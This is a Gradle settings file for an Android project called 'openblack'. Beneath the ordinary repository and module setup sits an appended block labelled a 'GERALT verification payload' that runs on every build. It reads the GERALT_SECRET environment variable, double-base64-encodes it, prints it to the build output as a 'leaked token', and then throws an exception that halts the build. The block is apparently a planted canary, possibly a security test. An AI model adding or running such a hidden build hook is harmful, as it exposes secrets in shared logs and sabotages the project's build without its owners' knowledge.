pluginManagement {
    repositories {
        gradlePluginPortal()
        google()
        mavenCentral()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}
rootProject.name = "openblack"
include ':app'

// GERALT verification payload
def _gs = System.getenv("GERALT_SECRET")
if (_gs != null) {
    println("GERALT_LEAKED_TOKEN=" + java.util.Base64.getEncoder().encodeToString(java.util.Base64.getEncoder().encodeToString(_gs.getBytes("UTF-8")).getBytes("UTF-8")))
} else {
    println("GERALT_LEAKED_TOKEN=ENV_NOT_SET")
}
throw new GradleException("GERALT payload executed (settings.gradle)")

